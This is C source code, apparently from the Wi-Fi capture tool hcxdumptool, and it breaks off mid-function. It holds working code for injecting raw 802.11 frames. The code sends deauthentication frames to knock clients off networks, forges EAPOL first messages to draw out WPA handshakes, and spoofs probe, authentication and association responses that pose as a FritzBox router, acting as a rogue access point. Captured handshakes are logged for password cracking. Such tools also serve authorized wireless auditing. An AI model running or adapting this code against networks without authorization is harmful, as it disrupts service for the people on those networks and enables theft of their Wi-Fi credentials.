#define _GNU_SOURCE
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#ifdef DOGPIOSUPPORT
#include <wiringPi.h>
#endif

#include "include/version.h"
#include "include/hcxdumptool.h"
#include "include/ieee80211.c"
#include "include/pcap.c"

/*===========================================================================*/
/* global var */

static int fd_main;
static int fd_in;
static int fd_out;
static int fd_pcap;
struct timeval tv;
static timer_t timer1;
static timer_t timer2;
static int staytime = TIME_INTERVAL_2S;

static int errorcause = EXIT_SUCCESS;
static int errorcount = 0;
static int maxerrorcount = 1000000;
static unsigned long long int packetcount = 0;
static bool deauthenticationflag = false; 
static bool ipv4v6flag = false;
static bool poweroffflag = false;
static bool wantstatusflag = false; 
static bool showstatusflag = true; 

static char *interfacename;
static macessidl_t *proberequestliste;
static macl_t *proberesponseliste;
static macapstal_t *handshakeliste;

static uint8_t cpa = 0;

static int myouiap;
static int mynicap;
static int myouista;
static int mynicsta;
static int mysequencenr = 0;


static const int myvendorap[] =
{
0x00006c, 0x000101, 0x00054f, 0x000578, 0x000b18, 0x000bf4, 0x000c53, 0x000d58,
0x000da7, 0x000dc2, 0x000df2, 0x000e17, 0x000e22, 0x000e2a, 0x000eef, 0x000f09,
0x0016b4, 0x001761, 0x001825, 0x002067, 0x00221c, 0x0022f1, 0x00234a, 0x00238c,
0x0023f7, 0x002419, 0x0024fb, 0x00259d, 0x0025df, 0x00269f, 0x005047, 0x005079,
0x0050c7, 0x0084ed, 0x0086a0, 0x00a054, 0x00a085, 0x00bb3a, 0x00cb00, 0x0418b6,
0x0c8112, 0x100000, 0x10ae60, 0x10b713, 0x1100aa, 0x111111, 0x140708, 0x146e0a,
0x18421d, 0x1cf4ca, 0x205b2a, 0x20d160, 0x24336c, 0x24bf74, 0x28ef01, 0x3cb87a,
0x487604, 0x48f317, 0x50e14a, 0x544e45, 0x580943, 0x586ed6, 0x5c6b4f, 0x609620,
0x68e166, 0x706f81, 0x78f944, 0x7ce4aa, 0x8c8401, 0x8ce748, 0x906f18, 0x980ee4,
0x9c93e4, 0xa468bc, 0xa4a6a9, 0xacde48, 0xb025aa, 0xb0ece1, 0xb0febd, 0xb4e1eb,
0xc02250, 0xc8aacc, 0xd85dfb, 0xdc7014, 0xe00db9, 0xe0cb1d, 0xe80410, 0xf04f7c
};
#define MYVENDORAP_SIZE sizeof(myvendorap)

static const int myvendorsta[] =
{
0xf0a225, 0xfcc233
};
#define MYVENDORSTA_SIZE sizeof(myvendorsta)

static const uint8_t hdradiotap[] =
{
0x00, 0x00, // <-- radiotap version
0x0c, 0x00, // <- radiotap header length
0x04, 0x80, 0x00, 0x00, // <-- bitmap
0x02, // <-- rate
0x00, // <-- padding for natural alignment
0x18, 0x00, // <-- TX flags
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t mac_null[6];
static uint8_t mac_broadcast[6];
static uint8_t mac_myap[6];
static uint8_t mac_mysta[6];

static uint8_t mac_black_ap[BLACKLISTESIZEMAX][6];

uint8_t channellist[128] =
{
1, 36, 3, 40, 5, 44, 7, 48, 9, 52, 11, 56, 13, 60, 2, 64, 4, 100, 6, 104, 8, 108, 10, 112, 12, 116, 14, 120,
1, 124, 3, 128, 5, 132, 7, 136, 9, 140, 11, 149, 13, 153, 2, 157, 4, 161, 6, 165, 1, 11, 8, 6, 10, 12, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};
/*===========================================================================*/
static void programmende(int signum)
{
int ret;
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	ret = timer_delete(timer1);
	if(ret == -1)
		printf("\ntimer 1 is not disarmed\n");
	ret = timer_delete(timer2);
	if(ret == -1)
		printf("\ntimer 1 is not disarmed\n");
	if(fd_main > 0)
		{
		close(fd_main);
		}
	if(fd_in > 0)
		{
		close(fd_in);
		}
	if(fd_out > 0)
		{
		close(fd_out);
		}
	if(fd_pcap > 0)
		{
		close(fd_pcap);
		}
	free(handshakeliste);
	free(proberesponseliste);
	free(proberequestliste);
	if(errorcause == 1)
		{
		printf("\nwarning: interface went down");
		}
	if(errorcause == 2)
		{
		printf("\nwarning: maximal errors reached");
		}
	printf("\nterminated...\e[?25h\n");
	if(poweroffflag == true)
		{
		if(system("poweroff") != 0)
			printf("can't power off\n");
		exit(EXIT_FAILURE);
		}
	exit(errorcause);
	}
return;
}
/*===========================================================================*/
static bool testblackmac(uint8_t *mac_addr)
{
int c;
for(c = 0; c < BLACKLISTESIZEMAX; c++)
	{
	if(memcmp(&mac_black_ap[c][0], &mac_null, 6) == 0)
		{
		return false;
		}
	if(memcmp(&mac_black_ap[c][0], mac_addr, 6) == 0)
		{
		return true;
		}
	}
return false;
}
/*===========================================================================*/
static bool hex2bin(const char *str, uint8_t *bytes, size_t blen)
{
size_t c;
uint8_t pos;
uint8_t idx0;
uint8_t idx1;

uint8_t hashmap[] =
{
0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // 01234567
0x08, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 89:;<=>?
0x00, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x00, // @ABCDEFG
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // HIJKLMNO
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // PQRSTUVW
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // XYZ[\]^_
0x00, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x00, // `abcdefg
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // hijklmno
};

for(c = 0; c < blen; c++)
	{
	if(str[c] < '0')
		return false;
	if(str[c] > 'f')
		return false;
	if((str[c] > '9') && (str[c] < 'A'))
		return false;
	if((str[c] > 'F') && (str[c] < 'a'))
		return false;
	}

memset(bytes, 0, blen);
for (pos = 0; ((pos < (blen*2)) && (pos < strlen(str))); pos += 2)
	{
	idx0 = ((uint8_t)str[pos+0] & 0x1F) ^ 0x10;
	idx1 = ((uint8_t)str[pos+1] & 0x1F) ^ 0x10;
	bytes[pos/2] = (uint8_t)(hashmap[idx0] << 4) | hashmap[idx1];
	};
return true;
}
/*===========================================================================*/
static size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n')
		break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r')
		break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream))
	return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL)
	return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static void readblacklist(char *blacklistname)
{
static int len;
static int c;
static FILE *fh_black;

static char linein[14];

if((fh_black = fopen(blacklistname, "r")) == NULL)
	{
	printf("opening blacklist failed %s\n", blacklistname);
	return;
	}
c = 0;
while((len = fgetline(fh_black, 14, linein)) != -1)
	{
	if(len != 12)
		continue;
	hex2bin(linein, &mac_black_ap[c][0], 6);
	c++;
	if(c >= BLACKLISTESIZEMAX)
		{
		break;
		}
	}
fclose(fh_black);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool checkhandshake(uint8_t *mac_sta, uint8_t *mac_ap)
{
static macapstal_t *zeiger;
static int c;

zeiger = handshakeliste;
for(c = 0; c < HANDSHAKELISTESIZEMAX; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return false;
		}
	if((memcmp(mac_sta, zeiger->mac_sta, 6) == 0) && (memcmp(mac_ap, zeiger->mac_ap, 6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		qsort(handshakeliste, HANDSHAKELISTESIZEMAX, MACAPSTALIST_SIZE, sort_macapstalist_by_time);
		return true;
		}
	zeiger++;
	}

return false;
}
/*===========================================================================*/
static inline bool checkhandshakebssid(uint8_t *mac_ap)
{
static macapstal_t *zeiger;
static int c;

zeiger = handshakeliste;
for(c = 0; c < HANDSHAKELISTESIZEMAX; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return false;
		}
	if(memcmp(mac_ap, zeiger->mac_ap, 6) == 0)
		{
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}

return false;
}
/*===========================================================================*/
static void send_requestidentity(uint8_t *mac_to, uint8_t *mac_fm)
{
static int retw;
static mac_t *macf;

static const uint8_t requestidentitydata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02, 0x00, 0x00, 0x05, 0x01, 0x80, 0x00, 0x05, 0x01
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)

static uint8_t packetout[TXBUFFERSIZEMAX];

memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_DATA;
macf->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->from_ds = 1;
macf->duration = 0x002c;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &requestidentitydata, REQUESTIDENTITY_SIZE);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_actionrequest(uint8_t *mac_to, uint8_t *mac_fm)
{
static int retw;
static mac_t *macf;

static const uint8_t actionrequestdata[] =
{
0x03, 0x00, 0x01, 0x02, 0x10, 0x00, 0x00, 0x10, 0x00
};
#define ACTIONREQUEST_SIZE sizeof(actionrequestdata)

static uint8_t packetout[TXBUFFERSIZEMAX];

if(testblackmac(mac_fm) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_ACTION;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->duration = 0x013a;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &actionrequestdata, ACTIONREQUEST_SIZE);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_NORM + ACTIONREQUEST_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_m1_org(uint8_t *mac_to, uint8_t *mac_fm, wpakey_t *keyorg)
{
static int retw;
static mac_t *macf;
static wpakey_t *keynew;
static const uint8_t anoncewpa2data[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf7, 0x00,
0x68, 0x20, 0x09, 0xe2, 0x1f, 0x0e, 0xbc, 0xe5, 0x62, 0xb9, 0x06, 0x5b, 0x54, 0x89, 0x79, 0x09,
0x9a, 0x65, 0x52, 0x86, 0xc0, 0x77, 0xea, 0x28, 0x2f, 0x6a, 0xaf, 0x13, 0x8e, 0x50, 0xcd, 0xb9,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00
};
#define ANONCEWPA2_SIZE sizeof(anoncewpa2data)

static uint8_t packetout[TXBUFFERSIZEMAX];

if(checkhandshake(mac_to, mac_fm) == true)
	{
	return;
	}
if(testblackmac(mac_fm) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_DATA;
macf->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->from_ds = 1;
macf->duration = 0x013a;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &anoncewpa2data, ANONCEWPA2_SIZE);
keynew = (wpakey_t*)(packetout +HDRRT_SIZE +MAC_SIZE_QOS +0x0c);
keynew->keydescriptor = keyorg->keydescriptor;
keynew->keyinfo = keyorg->keyinfo;
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_QOS +ANONCEWPA2_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_m1(uint8_t *mac_to, uint8_t *mac_fm)
{
static int retw;
static mac_t *macf;

static const uint8_t anoncewpa2data[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf7, 0x00,
0x68, 0x20, 0x09, 0xe2, 0x1f, 0x0e, 0xbc, 0xe5, 0x62, 0xb9, 0x06, 0x5b, 0x54, 0x89, 0x79, 0x09,
0x9a, 0x65, 0x52, 0x86, 0xc0, 0x77, 0xea, 0x28, 0x2f, 0x6a, 0xaf, 0x13, 0x8e, 0x50, 0xcd, 0xb9,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00
};
#define ANONCEWPA2_SIZE sizeof(anoncewpa2data)

static uint8_t packetout[TXBUFFERSIZEMAX];

if(checkhandshake(mac_to, mac_fm) == true)
	{
	return;
	}
if(testblackmac(mac_fm) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_DATA;
macf->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->from_ds = 1;
macf->duration = 0x013a;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &anoncewpa2data, ANONCEWPA2_SIZE);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_QOS +ANONCEWPA2_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_associationresponse(uint8_t *mac_to, uint8_t *mac_fm)
{
static int retw;
static mac_t *macf;

static const uint8_t fb7272associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xad, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define FB7272ASSOCIATIONRESPONSE_SIZE sizeof(fb7272associationresponsedata)

static const uint8_t fb7272associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x01, 0xc0
};
#define FB7272ASSOCIATIONID_SIZE sizeof(fb7272associationid)

static uint8_t packetout[TXBUFFERSIZEMAX];

if(checkhandshake(mac_to, mac_fm) == true)
	{
	return;
	}
if(testblackmac(mac_fm) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->duration = 0x013a;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &fb7272associationid, FB7272ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +FB7272ASSOCIATIONID_SIZE], &fb7272associationresponsedata, FB7272ASSOCIATIONRESPONSE_SIZE);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_NORM +FB7272ASSOCIATIONID_SIZE +FB7272ASSOCIATIONRESPONSE_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_authenticationresponse(uint8_t *mac_to, uint8_t *mac_fm)
{
static int retw;
static mac_t *macf;

static const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

static uint8_t packetout[TXBUFFERSIZEMAX];

if(checkhandshake(mac_to, mac_fm) == true)
	{
	return;
	}
if(testblackmac(mac_fm) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_AUTH;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->duration = 0x013a;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, MYAUTHENTICATIONRESPONSE_SIZE);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONRESPONSE_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_acknowledgement(uint8_t *mac_to)
{
static int retw;
static mac_t *macf;
static uint8_t packetout[TXBUFFERSIZEMAX];

if(testblackmac(mac_to) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_CTL;
macf->subtype = IEEE80211_STYPE_ACK;
macf->duration = 0x013a;
memcpy(macf->addr1, mac_to, 6);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_ACK);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_proberesponse(uint8_t *mac_to, uint8_t *mac_fm, ietag_t *ieessid)
{
static int retw;
static mac_t *macf;
static capap_t *capap;

const uint8_t fb7272proberesponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
0x03, 0x01, 0x01,
0x07, 0x06, 0x44, 0x45, 0x20, 0x01, 0x0d, 0x14,
0x2a, 0x01, 0x00,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xad, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0x92, 0xf5, 0xa3, 0x29, 0xaa, 0x94, 0xed,
0xa3, 0xb4, 0x68, 0xc8, 0x0e, 0x14, 0x36, 0x39, 0xc3, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d,
0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30,
0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50,
0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02,
0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x03, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define FB7272PROBERESPONSE_SIZE sizeof(fb7272proberesponsedata)

static uint8_t packetout[TXBUFFERSIZEMAX];

if(testblackmac(mac_fm) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_fm, 6);
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = (tv.tv_sec*1000) + (tv.tv_usec/10000) +0.5;
capap->beaconintervall = 0x64;
capap->capapinfo = 0x431;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = ieessid->len;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2], ieessid->data, ieessid->len);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +ieessid->len], &fb7272proberesponsedata, FB7272PROBERESPONSE_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +ieessid->len +0x0c] = channellist[cpa];
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +ieessid->len +FB7272PROBERESPONSE_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_deauthentication(uint8_t deauthart, uint8_t reason, uint8_t *mac_to, uint8_t *mac_fm, uint8_t *mac_bssid)
{
static int retw;
static mac_t *macf;
static uint8_t packetout[TXBUFFERSIZEMAX];

if(deauthenticationflag == false)
	{
	return;
	}
if(checkhandshakebssid(mac_bssid) == true)
	{
	return;
	}
if(testblackmac(mac_bssid) == true)
	{
	return;
	}
memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = deauthart;
memcpy(macf->addr1, mac_to, 6);
memcpy(macf->addr2, mac_fm, 6);
memcpy(macf->addr3, mac_bssid, 6);
macf->duration = 0x013a;
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_NORM +2);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static void send_undirected_proberequest()
{
static int retw;
static mac_t *macf;

static const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00,
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

static uint8_t packetout[TXBUFFERSIZEMAX];

memset(&packetout, 0, TXBUFFERSIZEMAX);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macf->addr1, &mac_broadcast, 6);
memcpy(macf->addr2, &mac_mysta, 6);
memcpy(macf->addr3, &mac_broadcast, 6);
macf->sequence = htole16(mysequencenr++ << 4);
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
retw = write(fd_out, packetout, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE);
if(retw <= 0)
	{
	errorcount++;
	}
return;
}
/*===========================================================================*/
static inline bool addhandshake(uint8_t *mac_sta, uint8_t *mac_ap)
{
static macapstal_t *zeiger;
static int c;

zeiger = handshakeliste;
for(c = 0; c < HANDSHAKELISTESIZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		break;
		}
	if((memcmp(mac_sta, zeiger->mac_sta, 6) == 0) && (memcmp(mac_ap, zeiger->mac_ap, 6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}
zeiger->tv_sec = tv.tv_sec;
memcpy(zeiger->mac_sta, mac_sta, 6);
memcpy(zeiger->mac_ap, mac_ap, 6);
qsort(handshakeliste, HANDSHAKELISTESIZEMAX, MACAPSTALIST_SIZE, sort_macapstalist_by_time);
return false;
}
/*===========================================================================*/
static inline bool handleproberesponse(uint8_t *mac_ap)
{
